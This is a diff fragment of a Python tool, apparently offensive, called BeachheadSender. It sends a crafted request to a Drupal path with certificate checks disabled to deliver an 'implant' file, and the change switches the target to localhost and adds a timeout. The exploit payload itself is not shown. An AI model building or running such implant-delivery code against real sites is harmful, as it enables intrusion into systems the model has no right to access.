@@ -50,13 +50,13 @@ class BeachheadSender:
         s = requests.Session()
         try:
             prepped = s.prepare_request(self.request)
-            s.send(prepped, verify=False)
-        except requests.exceptions.ConnectionError:
-            pass
+            s.send(prepped, verify=False, timeout=1)
+        except requests.exceptions.ConnectionError as e:
+            print(e)
 
 
 if __name__ == "__main__":
-    sender = BeachheadSender(ip_addr='10.0.2.15', port='8081',
-                             drupal_path='/drupal', implant_file_path='test/cnc_test3.py')
+    sender = BeachheadSender(ip_addr='127.0.0.1', port='8081',
+                             drupal_path='/drupal', implant_file_path='include/BeachheadReceiver.py')
     # print(sender.implant)
     sender.send_request()
